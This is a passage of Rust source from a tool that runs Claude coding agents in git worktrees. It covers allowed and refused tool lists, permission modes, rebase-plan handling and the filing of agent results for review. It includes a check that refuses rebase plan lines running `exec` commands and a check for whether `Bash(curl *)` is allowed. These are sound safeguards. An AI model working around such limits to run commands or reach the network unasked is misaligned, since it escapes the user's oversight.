    let init = init.map_err(|_| Error(format!("{claude} said nothing of its tools: it did not start, or not as claude does")))?;
    let names = |key: &str, field: Option<&str>| -> Vec<String> {
        init.get(key)
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
            .filter_map(|t| match field {
                Some(f) => t.get(f).and_then(Value::as_str),
                None => t.as_str(),
            })
            .map(String::from)
            .collect()
    };
    Ok((names("tools", None), names("mcp_servers", Some("name"))))
}

/// The tools every ask is given, whatever it is: they only read.
pub const GIVEN: [&str; 4] = ["Read", "Grep", "Glob", "LS"];

/// Tools that change things: let answer-only asks use them, and an answer
/// may change things too.
pub const CHANGING: [&str; 7] = ["Bash", "Edit", "MultiEdit", "Write", "NotebookEdit", "Task", "KillShell"];

/// The worktrees of a stack's own that changes, answers, and builds and
/// tests work in: `agent`, `agent-2`…, `answer-only-agent`…, `build` under
/// `.stacked/NAME`.
pub const AGENT: &str = "agent";
pub const ANSWERING: &str = "answer-only-agent";
pub const BUILD: &str = "build";

/// Where stack `name`'s agents' worktrees are: `.stacked/NAME` in its
/// repository, else under `under` (the settings' `agent.worktrees`), in a
/// folder of the repository's own.
fn agents_dir(repo: &Path, name: &str, under: Option<&Path>) -> Result<PathBuf> {
    match under {
        Some(d) => {
            let top = git::toplevel(repo)?;
            let tag = sha1_smol::Sha1::from(&top).digest().to_string();
            let short = Path::new(&top).file_name().map_or(String::new(), |n| n.to_string_lossy().into_owned());
            Ok(d.join(format!("{short}-{}", &tag[..8])).join(name))
        }
        None => git::stack_dir(repo, name),
    }
}

/// `kind`'s worktrees in `dir`, as named: KIND, then KIND-2, KIND-3…
fn slot(dir: &Path, kind: &str, k: usize) -> PathBuf {
    dir.join(if k == 1 { kind.to_string() } else { format!("{kind}-{k}") })
}

/// The first of `kind`'s worktrees in `dir` that no other running ask is
/// in and that holds nothing an agent left unfinished, taken for run `id`:
/// written as its worktree in the database, so that no other takes it. One
/// not there yet is made by `git::ready`.
fn take_slot(db_path: &Path, id: &str, dir: &Path, kind: &str) -> Result<PathBuf> {
    // What an agent left unfinished stays as it is, to look at; what a
    // build made, untracked, is the next build's to build on.
    let left = |at: &Path| if kind == BUILD { git::unfinished_tracked(at) } else { git::unfinished(at) };
    let mut k = 1;
    loop {
        let at = slot(dir, kind, k);
        k += 1;
        if at.join(".git").exists() && left(&at).unwrap_or(true) && !scrub_dropped(db_path, &at) {
            continue;
        }
        let path = at.to_string_lossy().into_owned();
        let taken = Db::edit(db_path, |db| {
            let busy = db
                .live_runs()
                .iter()
                .filter(|r| r.state == RunState::Started && r.id != id)
                .any(|r| info(r).and_then(|i| i.worktree).as_deref() == Some(path.as_str()));
            if busy {
                return Ok(false);
            }
            let run = db.run(id).cloned().ok_or_else(|| Error(format!("no run {id}")))?;
            let mut i = info(&run).ok_or_else(|| Error(format!("run {id} is not an ask")))?;
            i.worktree = Some(path.clone());
            i.kept = true;
            db.add_run(Run {
                ask: Some(serde_json::to_value(&i).unwrap()),
                ..run
            })?;
            Ok(true)
        })?;
        if taken {
            return Ok(at);
        }
    }
}

/// Whether worktree `at` holds only what a dropped guess left there, its
/// agent gone: then that is thrown away, and the worktree is free again.
fn scrub_dropped(db_path: &Path, at: &Path) -> bool {
    let path = at.to_string_lossy().into_owned();
    let Ok(db) = Db::load(db_path) else { return false };
    let last = db
        .runs()
        .into_iter()
        .filter(|r| info(r).and_then(|i| i.worktree).as_deref() == Some(path.as_str()))
        .max_by_key(|r| r.time);
    last.is_some_and(|r| info(r).is_some_and(|i| i.dropped) && !r.pid.is_some_and(alive)) && git::scrub(at).is_ok()
}

/// The kinds of worktree the agent's settings have made when the editor
/// opens a stack, and removed when it exits.
pub fn precreated(agent: &crate::config::Agent) -> Vec<&'static str> {
    let mut kinds = Vec::new();
    if agent.worktree == Workspace::Precreate {
        kinds.push(AGENT);
    }
    if agent.answer_only_worktree == Workspace::Precreate {
        kinds.push(ANSWERING);
    }
    kinds
}

/// Stack `name`'s first worktree of each of `kinds` made, if it is not
/// there, the whole stack applied in it: for the asks to come not to wait
/// for it; `under`, the settings' `agent.worktrees`. Where they are, to
/// remove once the editor exits.
pub fn precreate(db_path: &Path, name: &str, kinds: &[&str], under: Option<&Path>) -> Result<(PathBuf, PathBuf)> {
    let db = Db::load(db_path)?;
    let s = db.stack(name)?;
    let (repo, base) = base_of(s)?;
    let dir = agents_dir(&repo, name, under)?;
    let patches: Vec<&Patch> = s.patches.iter().map(|p| db.patch(p)).collect();
    let mbox = format_mbox(&patches);
    for kind in kinds {
        let at = slot(&dir, kind, 1);
        if !at.join(".git").exists() {
            git::ready(&repo, &at, &base, &mbox, patches.len(), &|_| {})?;
        }
    }
    Ok((repo, dir))
}

/// A stack's agents' worktrees made ahead: its repository, their folder,
/// and their kinds.
pub type Ahead = (PathBuf, PathBuf, Vec<&'static str>);

/// The worktrees made ahead, `made`, removed, away from the caller, which
/// need not wait: but those an ask is working in, and, as git refuses to
/// remove them, those with anything uncommitted.
pub fn forget(db_path: &Path, made: &[Ahead]) {
    let busy: HashSet<String> = Db::load(db_path)
        .map(|db| {
            db.live_runs()
                .iter()
                .filter(|r| r.state == RunState::Started)
                .filter_map(|r| info(r)?.worktree)
                .collect()
        })
        .unwrap_or_default();
    for (repo, dir, kinds) in made {
        let mut gone: Vec<PathBuf> = Vec::new();
        for kind in kinds {
            for k in 1.. {
                let at = slot(dir, kind, k);
                if !at.join(".git").exists() {
                    break;
                }
                if !busy.contains(&*at.to_string_lossy()) {
                    gone.push(at);
                }
            }
        }
        if gone.is_empty() {
            continue;
        }
        let mut c = Command::new("sh");
        c.arg("-c")
            .arg("for w; do git worktree remove \"$w\"; done; git worktree prune")
            .arg("sh")
            .args(&gone)
            .current_dir(repo)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null());
        std::os::unix::process::CommandExt::process_group(&mut c, 0);
        let _ = c.spawn();
    }
}

/// Whether rebase plan `text` may be given git as its todo: none of its
/// lines runs a command (`exec`, `x`), which could reach the network. The
/// line that would, said, if one does.
pub fn check_plan(text: &str) -> Result<()> {
    for (k, line) in text.lines().enumerate() {
        let word = line.split_whitespace().next().unwrap_or("");
        if matches!(word, "exec" | "x") {
            return err(format!(
                "the plan's line {} runs a command (`{}`), which is not allowed: the rebase is not started",
                k + 1,
                line.trim()
            ));
        }
    }
    Ok(())
}

/// The folder the agents' rebase plans are kept in, as the binary set it
/// as it starts (`plans_in`).
static PLANS: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();

/// Where the agents' rebase plans are kept, as the environment `var` names
/// it: the folder `$STACKED_TODO` names, else `stacked-todo` in the
/// temporary directory, which every stacked shares. One set to nothing is
/// not set, and one not from the root is taken from where stacked runs.
pub fn plans_from(var: impl Fn(&str) -> Option<std::ffi::OsString>) -> PathBuf {
    match var("STACKED_TODO").filter(|v| !v.is_empty()) {
        Some(v) => std::path::absolute(Path::new(&v)).unwrap_or_else(|_| PathBuf::from(v)),
        None => std::env::temp_dir().join("stacked-todo"),
    }
}

/// From now on, the agents' rebase plans are kept in `dir`, unless that was
/// set already: by the binary, as it starts, before any ask does. Whether
/// they are now.
pub fn plans_in(dir: PathBuf) -> bool {
    PLANS.set(dir).is_ok()
}

/// Where the asks on database `db` keep their rebase plans: where the
/// binary set it as it started; else beside the database. Only the tests'
/// own processes are never set up so: their plans are kept in the test's
/// own folder, and they never touch the one that every stacked shares.
fn plans(db: &Path) -> PathBuf {
    PLANS.get().cloned().unwrap_or_else(|| db.with_file_name("stacked-todo"))
}

/// The file in a plan's folder that names, in full, the git directory the
/// folder is for: the folder's own name is a hash of that path, which
/// cannot be read back.
const GITDIR: &str = "gitdir";

/// How long a folder that names no git directory, as a stacked of before
/// made them, is kept once nothing in it has changed: a day.
const UNNAMED_KEPT: std::time::Duration = std::time::Duration::from_secs(24 * 60 * 60);

/// Whether `name` is a plan folder's: the first 12 hex digits of a SHA-1.
fn plan_name(name: &str) -> bool {
    name.len() == 12 && name.bytes().all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
}

/// The folder in `base` for the rebase plans of git directory `gitdir`,
/// made if it is not there, and the file in it that names that git
/// directory written. Its name is the first 12 hex digits of the SHA-1 of
/// the git directory's path, as self-review names its own.
fn plan_folder(base: &Path, gitdir: &str) -> Result<PathBuf> {
    let dir = base.join(crate::diff::sha1_12(gitdir));
    let say = |e: std::io::Error| Error(format!("{}: {e}", dir.display()));
    std::fs::create_dir_all(&dir).map_err(say)?;
    std::fs::write(dir.join(GITDIR), format!("{gitdir}\n")).map_err(say)?;
    Ok(dir)
}

/// The git directory plan folder `dir` is for, as its `gitdir` file names
/// it. A file that names one whose hash is not the folder's name, as when
/// something else wrote over it, names none.
fn plan_gitdir(dir: &Path) -> Option<PathBuf> {
    let text = std::fs::read_to_string(dir.join(GITDIR)).ok()?;
    let gitdir = text.trim();
    let named = crate::diff::sha1_12(gitdir);
    (dir.file_name() == Some(std::ffi::OsStr::new(&named))).then(|| PathBuf::from(gitdir))
}

/// Whether a rebase is under way in git directory `gitdir`.
fn rebasing(gitdir: &Path) -> bool {
    ["rebase-merge", "rebase-apply"].iter().any(|f| gitdir.join(f).exists())
}

/// When anything in folder `dir` last changed: the folder itself, or one of
/// the files in it.
fn last_changed(dir: &Path) -> Option<std::time::SystemTime> {
    let mut last = std::fs::metadata(dir).and_then(|m| m.modified()).ok()?;
    for e in std::fs::read_dir(dir).ok()?.flatten() {
        if let Ok(t) = e.metadata().and_then(|m| m.modified()) {
            last = last.max(t);
        }
    }
    Some(last)
}

/// The plan folders of the asks still running on `db`, but run `id`'s.
fn plans_busy(db: &Db, id: &str) -> HashSet<PathBuf> {
    db.live_runs()
        .iter()
        .filter(|r| r.state == RunState::Started && r.id != id)
        .filter_map(|r| info(r)?.todo.map(PathBuf::from))
        .collect()
}

/// The plan folders in `base` that no rebase can want any more, removed:
/// each folder whose git directory is gone, as its `gitdir` file names it;
/// and each that names none, as a stacked of before made them, once nothing
/// in it has changed for a day (`now` being the time). Never a folder that
/// one of the asks still running (`busy`) writes its plan in: a folder
/// whose git directory is there is kept, rebase or not.
fn prune_plans(base: &Path, busy: &HashSet<PathBuf>, now: std::time::SystemTime) {
    let Ok(entries) = std::fs::read_dir(base) else {
        return;
    };
    for e in entries.flatten() {
        let dir = e.path();
        let named = e.file_name().to_str().is_some_and(plan_name);
        if !named || !e.file_type().is_ok_and(|t| t.is_dir()) || busy.contains(&dir) {
            continue;
        }
        let gone = match plan_gitdir(&dir) {
            Some(gitdir) => matches!(gitdir.try_exists(), Ok(false)),
            None => last_changed(&dir).is_some_and(|t| now.duration_since(t).is_ok_and(|d| d > UNNAMED_KEPT)),
        };
        if gone {
            let _ = std::fs::remove_dir_all(&dir);
        }
    }
}

/// Plan folder `dir`, its ask landed, removed: unless a rebase may still
/// want it, one of the asks still running (`busy`) writing its plan there,
/// or a rebase under way in its git directory.
fn drop_plan(dir: &Path, busy: &HashSet<PathBuf>) {
    let named = dir.file_name().and_then(|n| n.to_str()).is_some_and(plan_name);
    if !named || busy.contains(dir) || plan_gitdir(dir).is_some_and(|g| rebasing(&g)) {
        return;
    }
    let _ = std::fs::remove_dir_all(dir);
}

/// Where a change to the stack writes its rebase plan, for the worktree (or
/// checkout) `dir`: in `base`, the folder for its git directory, outside
/// that git directory, which claude may not write in, as self-review has
/// it; a plan an earlier ask left there gone. The folders whose worktree is
/// gone are removed first, but those of the asks still running (`busy`).
fn rebase_todo(base: &Path, dir: &Path, busy: &HashSet<PathBuf>) -> Result<PathBuf> {
    let gitdir = git::git(dir, &["rev-parse", "--absolute-git-dir"])?;
    prune_plans(base, busy, std::time::SystemTime::now());
    let todo = plan_folder(base, gitdir.trim())?.join("REBASE_TODO");
    let _ = std::fs::remove_file(&todo);
    Ok(todo)
}

/// Starts claimed run `id`: its worktree made, its prompt written, claude
/// started.
fn start(db_path: &Path, id: &str) -> Result<()> {
    let db = Db::load(db_path)?;
    let run = db.run(id).cloned().ok_or_else(|| Error(format!("no run {id}")))?;
    let mut i = info(&run).ok_or_else(|| Error(format!("run {id} is not an ask")))?;
    let s = started_from(&db, &i)?;
    let (repo, base) = base_of(&s)?;
    // A repository kept in memory, as the demo's: answered there, by the
    // stand-in it names, not by claude in a worktree on disk.
    #[cfg(feature = "demo")]
    if crate::memory::is_repo(&repo) {
        return crate::memory::agent(db_path, id);
    }
    i.base = base.clone();
    i.repo = repo.to_string_lossy().into_owned();
    // Each command it runs to start, in its stream as it goes: what the
    // comment says while the agent has not written yet.
    let step = |text: String| {
        let event = serde_json::json!({"type": STARTING, "text": text});
        let _ = Db::append(db_path, &[Record::Event { run: id.into(), event }]);
    };
    let upto = match &i.scope {
        Scope::Stack => s.patches.len(),
        Scope::Patch(c) => {
            let k = s
                .patches
                .iter()
                .position(|p| db.patch(p).change == *c)
                .ok_or_else(|| Error("its patch is no longer in the stack".into()))?;
            i.patch = Some((s.patches[k].clone(), k));
            k + 1
        }
    };
    // Where it works, as the settings say (those of the stack's checkout,
    // read now): an answer in the repository as it is (pwd), else in a
    // worktree of the stack's own, the stack up to its place applied; a
    // change in one, or in the user's checkout moved to the stack (pwd); a
    // build and test in the stack's build worktree, always.
    let (cfg, _) = crate::config::of(&repo);
    let agent = &cfg.agent;
    let patches: Vec<&Patch> = s.patches[..upto].iter().map(|p| db.patch(p)).collect();
    let mbox = format_mbox(&patches);
    match (i.way, agent.worktree, agent.answer_only_worktree) {
        (Way::Answer, _, Workspace::Pwd) => {}
        (Way::Change, Workspace::Pwd, _) => {
            if git::unfinished_tracked(&repo)? {
                return err(format!(
                    "{} has changes to files git tracks: a change asked there (agent.worktree = \"pwd\") needs it clean; nothing asked",
                    repo.display()
                ));
            }
            let back = git::head_of(&repo)?;
            i.untracked = git::untracked(&repo)?.into_iter().collect();
            if let Err(e) = git::ready(&repo, &repo, &base, &mbox, upto, &step) {
                let _ = git::back_to(&repo, &back);
                return Err(e);
            }
            i.back = Some(back);
            i.worktree = Some(repo.to_string_lossy().into_owned());
        }
        (way, _, _) => {
            let kind = match way {
                Way::Change => AGENT,
                Way::Answer => ANSWERING,
                Way::Test => BUILD,
            };
            let dir = agents_dir(&repo, &s.name, agent.worktrees.as_deref())?;
            let slot = take_slot(db_path, id, &dir, kind)?;
            git::ready(&repo, &slot, &base, &mbox, upto, &step)?;
            i.worktree = Some(slot.to_string_lossy().into_owned());
            i.kept = true;
        }
    }
    // Back where it was, the user's checkout, should starting go no further.
    let undo = |i: &Info| {
        if let Some(back) = &i.back {
            let _ = git::back_to(&repo, back);
        }
    };
    if i.way == Way::Change {
        let wt = PathBuf::from(i.worktree.clone().unwrap_or_default());
        let shas: Vec<String> = git::git(&wt, &["rev-list", "--reverse", &format!("{base}..HEAD")])?
            .lines()
            .map(String::from)
            .collect();
        if shas.len() != upto {
            undo(&i);
            return err(format!("{upto} patches made {} commits: is one empty?", shas.len()));
        }
        i.commits = shas.into_iter().zip(s.patches[..upto].iter().cloned()).collect();
    }
    let exe = match CLAUDE.lock().unwrap().clone() {
        Some((_, stacked)) => stacked,
        None => std::env::current_exe().map_err(|e| Error(e.to_string()))?,
    };
    let db_abs = db_path.canonicalize().map_err(|e| Error(e.to_string()))?;
    let cmd = format!("{} -f {}", exe.display(), db_abs.display());
    // What it may use: what stacked gives its kind of ask, and what the
    // settings add, for its kind and for every ask.
    let tools = tools_for(i.way, &cmd, agent);
    let curl = tools.split(',').any(|t| t == "Bash(curl *)");
    i.prompt = prompt(&db, &i, &s, &cmd, id, agent.schema, curl);
    let cwd = i.worktree.clone().map_or(repo.clone(), PathBuf::from);
    // A change to the stack rewrites what is below HEAD with a plan it
    // writes, which a plain `git rebase -i` takes: claude refuses a command
    // that sets an editor. Its plan's folder is kept in the run, to remove
    // once it lands.
    let plans = plans(&db_abs);
    let todo = match (i.way, &i.scope) {
        (Way::Change, Scope::Stack) => Some(rebase_todo(&plans, &cwd, &plans_busy(&db, id))?),
        _ => None,
    };
    if let Some(todo) = &todo {
        i.prompt += &format!("\n\nThe rebase todo file: {}", todo.display());
        i.todo = todo.parent().map(|d| d.to_string_lossy().into_owned());
    }
    let permission = match i.way {
        Way::Answer => "default",
        _ => "acceptEdits",
    };
    let mut run = Run {
        ask: Some(serde_json::to_value(&i).unwrap()),
        ..run
    };
    let landed = Db::edit(db_path, |db| {
        // Unless it was landed meanwhile, taken for one left behind: then
        // the folder made for its plan goes.
        if db.run(id).is_some_and(|r| r.state == RunState::Started) {
            db.add_run(run.clone())?;
            Ok(false)
        } else {
            if let Some(dir) = &i.todo {
                drop_plan(Path::new(dir), &plans_busy(db, id));
            }
            Ok(true)
        }
    })?;
    if landed {
        undo(&i);
        return err("it was landed while its worktree was made");
    }
    let mut c = Command::new("sh");
    c.arg("-c").arg(WRAPPER).arg("sh").arg(id).arg(&cwd).arg(&exe).arg(&db_abs);
    c.args(["--output-format", "stream-json", "--verbose"]);
    c.args(["--permission-mode", permission, "--allowedTools", &tools]);
    // The plan checked (one that runs a command is refused), then copied in
    // as the rebase's todo, the messages kept: no editor opens. The plan's
    // folder is claude's to write in, as the worktree is.
    if let Some(todo) = &todo {
        let quoted = |p: &Path| format!("'{}'", p.display().to_string().replace('\'', "'\\''"));
        c.env("GIT_SEQUENCE_EDITOR", format!("{} __plan {}", quoted(&exe), quoted(todo)));
        c.env("GIT_EDITOR", "true");
        if let Some(dir) = todo.parent() {
            c.arg("--add-dir").arg(dir);
        }
    }
    // What would run another program, of what a change may run: refused.
    // And to every ask, what the checkout's claude settings of yours deny,
    // as claude does in the checkout: a worktree of the stack's own has no
    // file of yours, git tracking none.
    let mut refused: Vec<String> = Vec::new();
    if i.way == Way::Change {
        refused.push(crate::claude::refused_tools());
    }
    refused.extend(crate::setup::denied(&repo));
    if !refused.is_empty() {
        c.args(["--disallowedTools", &refused.join(",")]);
    }
    // Its answer asked as structured output, checked against what this ask
    // asks for; else read from what it writes.
    if agent.schema {
        c.args(["--json-schema", &answer_schema(&i, &s).to_string()]);
    }
    // What the settings add: a model, arguments of the user's; then the
    // effort the ask goes at, in place of one they give.
    let args = at_effort(cfg.agent_args(), i.effort);
    c.args(&args);
    c.stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null());
    // The program run as claude: the tests' stand-in, else $STACKED_CLAUDE,
    // the settings' or claude.
    let claude = match CLAUDE.lock().unwrap().clone() {
        Some((claude, _)) => claude.to_string_lossy().into_owned(),
        None => cfg.agent_command(),
    };
    let extra: String = args.iter().map(|a| format!(" {a}")).collect();
    step(format!("{claude} -p … --permission-mode {permission}{extra}, in {}", cwd.display()));
    c.env("STACKED_CLAUDE", claude);
    // The stacked it calls back keeps what is yours where this one does:
    // nowhere, in the tests' own processes. It keeps the agents' rebase
    // plans where this one does too.
    crate::home::get().pass_on(&mut c);
    c.env("STACKED_TODO", &plans);
    // The agent's commits are read back as patches, then gone: not signed,
    // which would want the user's key for each.
    unsigned(&mut c);
    std::os::unix::process::CommandExt::process_group(&mut c, 0);
    let child = c.spawn().map_err(|e| Error(format!("sh: {e}")))?;
    run.pid = Some(child.id());
    Db::edit(db_path, |db| {
        // Unless it already landed: claude may be that quick.
        if db.run(id).is_some_and(|r| r.state == RunState::Started) {
            db.add_run(run)?;
        }
        Ok(())
    })
}

/// `args`, the arguments the settings add to claude, with `--effort` at
/// `effort`, the ask's, after them, in place of any `--effort` of theirs;
/// as they are for an ask with none.
fn at_effort(args: Vec<String>, effort: Option<Effort>) -> Vec<String> {
    let Some(effort) = effort else { return args };
    let mut out = Vec::new();
    let mut args = args.into_iter();
    while let Some(a) = args.next() {
        if a == "--effort" {
            args.next();
        } else if !a.starts_with("--effort=") {
            out.push(a);
        }
    }
    out.extend(["--effort".to_string(), effort.name().to_string()]);
    out
}

/// Appends each line of `input` to run `id`'s events as it comes: JSON as
/// it is, any other line as `{"type": "text", "text": ...}`.
pub fn record(db_path: &Path, id: &str, input: impl BufRead) -> Result<()> {
    for line in input.lines() {
        let line = line.map_err(|e| Error(e.to_string()))?;
        if line.trim().is_empty() {
            continue;
        }
        let event = serde_json::from_str::<Value>(&line)
            .ok()
            .filter(Value::is_object)
            .unwrap_or_else(|| serde_json::json!({"type": "text", "text": line}));
        Db::append(db_path, &[Record::Event { run: id.into(), event }])?;
    }
    Ok(())
}

/// How run `id`'s agent exited: as its stream says, else `exit` (it was
/// killed), else unknown.
fn exit_code(db: &Db, id: &str, exit: Option<&str>) -> String {
    db.events(id)
        .iter()
        .rev()
        .find(|e| e.get("type").and_then(Value::as_str) == Some("exit"))
        .map(|e| str_of(e.get("code")))
        .or(exit.map(String::from))
        .unwrap_or_else(|| "unknown".into())
}

/// What the agent answered last: the structured output of its stream's
/// `result`, as JSON, when it gave one; else what that `result` says.
fn result_text(events: &[&Value]) -> String {
    let results = || events.iter().rev().filter(|v| v.get("type").and_then(Value::as_str) == Some("result"));
    if let Some(o) = results().find_map(|v| v.get("structured_output").filter(|o| o.is_object())) {
        return o.to_string();
    }
    results().find_map(|v| v.get("result").and_then(Value::as_str).map(String::from)).unwrap_or_default()
}

/// How the agent's stream ended, when it ended in an error: as its
/// `result` says, said.
fn ended_badly(events: &[&Value]) -> Option<String> {
    let r = events.iter().rev().find(|v| v.get("type").and_then(Value::as_str) == Some("result"))?;
    if r.get("is_error").and_then(Value::as_bool) != Some(true) {
        return None;
    }
    Some(match r.get("subtype").and_then(Value::as_str).unwrap_or("") {
        "error_max_structured_output_retries" => "its answer never fit what it was asked for, tried again and again".into(),
        "error_max_turns" => "it ran out of turns".into(),
        "" => "it said it failed".into(),
        other => other.to_string(),
    })
}

/// The tools the agent was not let use, as its result says
/// (`permission_denials`): each once, a command by its program.
fn refused(events: &[&Value]) -> Vec<String> {
    let result = events.iter().rev().find(|v| v.get("type").and_then(Value::as_str) == Some("result"));
    let mut out: Vec<String> = Vec::new();
    for d in result.and_then(|r| r.get("permission_denials")).and_then(Value::as_array).into_iter().flatten() {
        let name = d.get("tool_name").and_then(Value::as_str).unwrap_or("a tool");
        let said = match d.get("tool_input").and_then(|i| i.get("command")).and_then(Value::as_str) {
            Some(c) if name == "Bash" => format!("Bash({} …)", c.split_whitespace().next().unwrap_or("")),
            _ => name.to_string(),
        };
        if !out.contains(&said) {
            out.push(said);
        }
    }
    out
}

/// How an ask in `way` may be let use more, said after what it was not let
/// use: the list of the settings for its kind, which `stacked setup agent`
/// sets; for a build and test, which runs any command already, every ask's.
fn allow_more(way: Way) -> &'static str {
    match way {
        Way::Change => {
            "agent.change_tools lets asks that change the stack use more, and `stacked setup agent` sets it; your claude settings can allow more too"
        }
        Way::Answer => "agent.answer_tools lets answer-only asks use more, and `stacked setup agent` sets it; your claude settings can allow more too",
        Way::Test => {
            "agent.tools lets every ask use more, builds and tests too, and `stacked config agent.tools` sets it; your claude settings can allow more too"
        }
    }
}

fn str_of(v: Option<&Value>) -> String {
    match v {
        Some(Value::String(s)) => s.clone(),
        Some(Value::Null) | None => String::new(),
        Some(o) => o.to_string(),
    }
}

/// What claude replied to each comment: `replies`, else labels at the top.
fn replies_of(text: &str) -> Map<String, Value> {
    match last_object(text).and_then(|o| o.get("replies").and_then(Value::as_object).cloned()) {
        Some(r) => r,
        None => parse_claude_replies(text).unwrap_or_default(),
    }
}

/// What landing an ask did, before it is a run.
struct Landed {
    ok: bool,
    summary: String,
    /// Leave the worktree made for it: it holds work not filed.
    keep: bool,
    /// What it brought back, held for review.
    held: Held,
}

impl Landed {
    /// What claude brought back, held for review.
    fn held(held: Held) -> Landed {
        let summary = if held.is_empty() {
            crate::held::NOTHING_BACK.to_string()
        } else {
            format!("its work waits for your review: {}", held.said())
        };
        Landed {
            ok: true,
            summary,
            keep: false,
            held,
        }
    }

    fn failed(summary: impl Into<String>, keep: bool) -> Landed {
        Landed {
            ok: false,
            summary: summary.into(),
            keep,
            held: Held::default(),
        }
    }
}

/// Files what a finished ask did; once, however often it is called. `exit`
/// says how claude exited when its events cannot (it was killed). Then
/// starts what was waiting behind it.
pub fn land(db_path: &Path, id: &str, exit: Option<&str>) -> Result<Run> {
    // What landing does is done once first, on a copy, with no lock held:
    // what takes long (the stack made checked to apply, on a big
    // repository) is then remembered, and under the lock it is only
    // written. Nothing of the copy is written.
    if let Ok(mut dry) = Db::load(db_path)
        && let Some(started) = dry.run(id).cloned()
        && started.state == RunState::Started
        && let Some(i) = info(&started)
        && exit_code(&dry, id, exit) == "0"
    {
        let output = result_text(&dry.events(id));
        let _ = file(&mut dry, &started, &i, &output);
    }
    // Where it worked, to leave as it should be once it is filed.
    let mut after: Option<Info> = None;
    let run = Db::edit(db_path, |db| {
        let Some(started) = db.run(id).cloned() else {
            return err(format!("no run {id}"));
        };
        // Under the lock, so two landings cannot both file it.
        if started.state != RunState::Started {
            return Ok(started);
        }
        let Some(i) = info(&started) else {
            return err(format!("run {id} is not an ask"));
        };
        after = Some(i.clone());
        let events = db.events(id);
        let code = exit_code(db, id, exit);
        let output = result_text(&events);
        // What it was not let use, said, so that it may be allowed.
        let refused = refused(&events);
        let mut landed = if code != "0" {
            let said: Vec<String> = events
                .iter()
                .filter(|e| e.get("type").and_then(Value::as_str) == Some("text"))
                .map(|e| str_of(e.get("text")))
                .collect();
            let keep = left_work(&i);
            let mut summary = format!("the agent failed ({code}): {}", said.join("\n").trim());
            if let Some(why) = ended_badly(&events) {
                summary += &format!("; {why}");
            }
            if keep {
                summary += &format!("; its work is left in {}", left_in(&i));
            }
            Landed::failed(summary, keep)
        } else {
            // Whatever goes wrong filing it is what came of it: a run left
            // started would be landed again and again.
            file(db, &started, &i, &output).unwrap_or_else(|e| {
                let at = i.worktree.as_ref().map_or(String::new(), |_| format!("; its work is left in {}", left_in(&i)));
                Landed::failed(format!("could not file what the agent did: {}{at}", e.0), true)
            })
        };
        // Bringing nothing back, it waits for your review all the same while
        // a comment it was asked about is still open: to close or keep.
        let open = crate::held::asking_open(db, &started).len();
        let waits = landed.ok && (!landed.held.is_empty() || open > 0);
        if landed.ok && landed.held.is_empty() && open > 0 {
            landed.summary = format!("{}: its work waits for your review", crate::held::nothing_back(open, i.notes.len()));
        }
        if !refused.is_empty() {
            landed.summary += &format!("; the agent was not allowed to use {}: {}", refused.join(", "), allow_more(i.way));
        }
        if !landed.ok {
            mark_failed(db, &i, &landed.summary)?;
        }
        if landed.keep {
            after = None;
        }
        // Held for review: in the queue, unless it brought nothing back and
        // no comment it was asked about is still open.
        let held = waits.then(|| Held { at: now(), ..landed.held });
        let run = Run {
            state: if landed.ok { RunState::Done } else { RunState::Failed },
            summary: landed.summary,
            output,
            pid: None,
            held,
            ..started
        };
        db.add_run(run.clone())?;
        // Its rebase plan's folder goes, failed or not, under the lock: an
        // ask that takes its worktree next makes the folder again.
        if let Some(dir) = &i.todo {
            drop_plan(Path::new(dir), &plans_busy(db, id));
        }
        Ok(run)
    })?;
    if let Some(i) = after {
        leave(&i);
    }
    launch(db_path)?;
    Ok(run)
}

/// Whether the agent left work unfinished where run `i` worked: anything
/// uncommitted; in the user's checkout, of what was not there before.
fn left_work(i: &Info) -> bool {
    let Some(w) = i.worktree.as_deref() else {
        return false;
    };
    let w = Path::new(w);
    if i.back.is_some() {
        git::unfinished_tracked(w).unwrap_or(true)
            || git::untracked(w).map_or(true, |now| now.iter().any(|f| !i.untracked.contains(f)))
    } else if i.way == Way::Test {
        // What a build made, untracked, is not work: the next build's.
        git::unfinished_tracked(w).unwrap_or(false)
    } else {
        git::unfinished(w).unwrap_or(false)
    }
}

/// Where run `i`'s agent left its work, said: in the user's checkout, with
/// how to take it back.
fn left_in(i: &Info) -> String {
    let w = i.worktree.clone().unwrap_or_default();
    match &i.back {
        Some(git::Head::Branch(b)) => format!("your checkout, {w}, at the stack: `git switch {b}` takes it back"),
        Some(git::Head::Commit(c)) => {
            format!("your checkout, {w}, at the stack: `git switch --detach {}` takes it back", &c[..12.min(c.len())])
        }
        None => w,
    }
}

/// Where run `i` worked, once it is filed and nothing is left unfinished
/// there: a worktree made for it alone (by a stacked of before), removed;
/// one of the stack's own, kept for the next ask; the user's checkout,
/// back where it was.
fn leave(i: &Info) {
    let Some(w) = i.worktree.as_deref() else {
        return;
    };
    match &i.back {
        Some(back) => {
            let _ = git::back_to(Path::new(w), back);
        }
        None if !i.kept => git::remove_scratch(Path::new(&i.repo), Path::new(w)),
        None => {}
    }
}

/// The comment the agent names `name` in what it points at: a label of
/// ask `i`'s comments (`c1`), or the id of one of stack `stack`'s as
/// `stacked comments` lists it.
fn named_comment(db: &Db, i: &Info, stack: &str, name: &str) -> Option<(String, String)> {
    let name = name.trim().trim_start_matches('[').trim_end_matches(']');
    if let Some(sh) = i.notes.iter().find(|sh| sh.label == name) {
        return Some((sh.change.clone(), sh.id.clone()));
    }
    db.find_note(stack, name).ok().map(|n| (n.change.clone(), n.id.clone()))
}

/// Claude's replies to the comments it was sent, held: turns `way` names.
fn held_replies(db: &Db, i: &Info, replies: &Map<String, Value>) -> Vec<crate::held::Reply> {
    let stack = db.node(i.from).map(|s| s.name.clone()).unwrap_or_default();
    i.notes
        .iter()
        .filter(|sh| db.note(&sh.change, &sh.id).is_some())
        .filter_map(|sh| {
            Some(crate::held::Reply {
                change: sh.change.clone(),
                id: sh.id.clone(),
                text: replies.get(&sh.label).map(|v| {
                    // Numbered after the comment's own references, as the
                    // prompt said: nothing could be attached meanwhile.
                    let first = db.note(&sh.change, &sh.id).map_or(1, crate::refs::next_of);
                    crate::refs::written_with(v, first, &|c| named_comment(db, i, &stack, c))
                })?,
                tag: i.way.name().into(),
                ..Default::default()
            })
        })
        .collect()
}

/// What claude brought back, held for review; nothing of it is applied.
